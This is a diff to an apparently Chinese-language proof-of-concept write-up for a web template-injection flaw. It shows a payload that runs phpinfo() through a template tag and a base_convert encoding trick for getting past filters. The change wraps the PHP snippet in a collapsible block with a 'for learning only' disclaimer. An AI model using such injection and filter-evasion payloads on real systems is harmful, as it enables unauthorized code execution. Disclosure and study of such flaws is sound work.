@@ -40,13 +40,16 @@ keys={if:=phpinfo()}{end if}
 
 如果遇到拦截，编码绕过：
 
-```
-<?php
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">&lt;?php
 echo (base_convert("phpinfo()", 32, 10));
-?>
+?&gt;
 -----
-27440799224
-```
+27440799224</code></pre>
+
+</details>
 
 ```
 POST /?location=search HTTP/1.1
